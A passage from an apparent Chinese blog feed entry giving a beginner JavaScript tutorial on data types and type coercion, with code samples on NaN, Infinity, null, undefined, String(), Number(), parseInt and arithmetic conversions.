class="hljs-string">"abc"</span> * <span class="hljs-string">"def"</span>;<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//NaN Not a Number</span>a = <span class="hljs-literal">NaN</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a);  <span class="hljs-comment">//NaN也是number类型</span>a = <span class="hljs-number">0.1</span> + <span class="hljs-number">0.2</span>;<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//0.30000000000000004 JS中浮点类型并不精确</span>a = <span class="hljs-built_in">Number</span>.MAX_VALUE+<span class="hljs-built_in">Number</span>.MAX_VALUE;<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//Infinity表示超过了number的最大表示范围</span>a = <span class="hljs-literal">Infinity</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a);  <span class="hljs-comment">//Infinity也是number类型</span></code></pre></div><h3 id="Boolean类型"><a href="#Boolean类型" class="headerlink" title="Boolean类型"></a>Boolean类型</h3><p>布尔值只有true和false两个值。</p><h3 id="Null和Undefined类型"><a href="#Null和Undefined类型" class="headerlink" title="Null和Undefined类型"></a>Null和Undefined类型</h3><p>null专门用来表示一个空的对象，所以它的类型不是Null。undefined只用来表示声明的未定义的变量。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-literal">null</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//Object</span><span class="hljs-keyword">var</span> b;<span class="hljs-built_in">console</span>.log(b); <span class="hljs-comment">//Undefined</span></code></pre></div><h3 id="强制转换为String类型"><a href="#强制转换为String类型" class="headerlink" title="强制转换为String类型"></a>强制转换为String类型</h3><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">//调用被转数据类型的toString()方法，但不会改变原数据的类型，注意Null和Undefined是没有toString()方法的</span><span class="hljs-keyword">var</span> a = <span class="hljs-number">123</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span><span class="hljs-keyword">var</span> b = a.toString(); <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> b); <span class="hljs-comment">//string</span>a = <span class="hljs-literal">null</span>;b = a.toString(); <span class="hljs-comment">//无效</span>a = <span class="hljs-literal">undefined</span>;b = a.toString(); <span class="hljs-comment">//无效</span><span class="hljs-comment">//调用String()函数,将转换变量作为参数传入，对于Number和Boolean实际还是调用toString()，但对null和undefined可以转为字符串</span>a = <span class="hljs-number">123</span>;a = <span class="hljs-built_in">String</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//string</span>a = <span class="hljs-literal">null</span>;a = <span class="hljs-built_in">String</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//null</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//string</span>a = <span class="hljs-literal">undefined</span>;a = <span class="hljs-built_in">String</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//undefined</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//string</span></code></pre></div><h3 id="强制转换为Number类型"><a href="#强制转换为Number类型" class="headerlink" title="强制转换为Number类型"></a>强制转换为Number类型</h3><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// 调用Number()函数</span><span class="hljs-keyword">var</span> a = <span class="hljs-string">"123"</span>;a = <span class="hljs-built_in">Number</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//123</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span>a = <span class="hljs-string">"abc"</span>; <span class="hljs-comment">//abc不能转换为数字</span>a = <span class="hljs-built_in">Number</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//NaN</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span>a = <span class="hljs-string">"  "</span>;a = <span class="hljs-built_in">Number</span>(a); <span class="hljs-comment">//如果字符串是空串或者全是空格就会转为0</span><span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//0</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span>a = <span class="hljs-literal">true</span>;a = <span class="hljs-built_in">Number</span>(a); <span class="hljs-comment">//布尔值真为1</span><span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//1</span>a = <span class="hljs-literal">false</span>;a = <span class="hljs-built_in">Number</span>(a); <span class="hljs-comment">//布尔值假为0</span><span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//0</span>a = <span class="hljs-literal">null</span>;a = <span class="hljs-built_in">Number</span>(a); <span class="hljs-comment">//null转为数字就是0</span><span class="hljs-built_in">console</span>.log(a);a = <span class="hljs-literal">undefined</span>;a = <span class="hljs-built_in">Number</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">// undefined只能转为NaN</span><span class="hljs-comment">// 专门负责字符串的转换:parseInt()--字符串转整数 parseFloat()字符串转浮点数</span>a = <span class="hljs-string">"123xp"</span>;a = <span class="hljs-built_in">parseInt</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//123 parseInt()将字符串中有效的数字部分取出转为int</span>a = <span class="hljs-string">"123def567"</span>;a = <span class="hljs-built_in">parseInt</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//123</span>a = <span class="hljs-string">"gg123def567"</span>;a = <span class="hljs-built_in">parseInt</span>(a);<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//NaN</span><span class="hljs-comment">//对于非string类型的变量如a=true，会先转为字符串“true”，再作为参数，所以返回是NaN</span></code></pre></div><h3 id="强制转换为布尔类型"><a href="#强制转换为布尔类型" class="headerlink" title="强制转换为布尔类型"></a>强制转换为布尔类型</h3><p>对于数字转布尔，除了0和NaN为false，其它值都是true。</p><p>对于字符串转布尔，除了空串为false，其余都是true，包括空格串。</p><p>Null转布尔是false。</p><p>Undefined转布尔是false。</p><h3 id="使用算术运算符转换数据类型"><a href="#使用算术运算符转换数据类型" class="headerlink" title="使用算术运算符转换数据类型"></a>使用算术运算符转换数据类型</h3><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// 对非Number类型的数据运算（加法对字符串有特殊）时，会将其先转为Number再运算，所以对直接a-0可以转number</span><span class="hljs-keyword">var</span> a = <span class="hljs-string">"123"</span> - <span class="hljs-number">0</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span>a = +<span class="hljs-string">"123"</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number 正负号直接将数据转为Number</span>a = <span class="hljs-number">1</span> + <span class="hljs-literal">true</span>;<span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//number</span>a = a + <span class="hljs-literal">NaN</span>;<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//NaN 任何值与NaN运算都是NaN</span><span class="hljs-comment">// 两个字符串相加不是Number，而是拼接字符串，注意只有加法！！</span>a = <span class="hljs-string">"123"</span> + <span class="hljs-string">"456"</span>;<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">// 123456</span><span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">typeof</span> a); <span class="hljs-comment">//string</span><span class="hljs-comment">// 任何值与字符串相加都是先转为字符串，然后拼串</span>a = <span class="hljs-number">123</span> + <span class="hljs-string">"456"</span>;<span class="hljs-built_in">console</span>.log(a); <span class="hljs-comment">//123456</span><span class="hljs-comment">// 所以对数据直接加一个“”空串可以转为字符串</span></code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS中的变量类型与强制转换&quot;&gt;&lt;a href=&quot;#JS中的变量类型与强制转换&quot; class=&quot;headerlink&quot; title=&quot;JS中的变量类型与强制转换&quot;&gt;&lt;/a&gt;JS中的变量类型与强制转换&lt;/h1&gt;&lt;p&gt;JS中一共有六种数据类型：&lt;/p&gt;
&lt;p&gt;Strin</summary>
      
    
    
    
    <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="javaScript" scheme="http://yoursite.com/tags/javaScript/"/>
    
  </entry>
  
</feed>
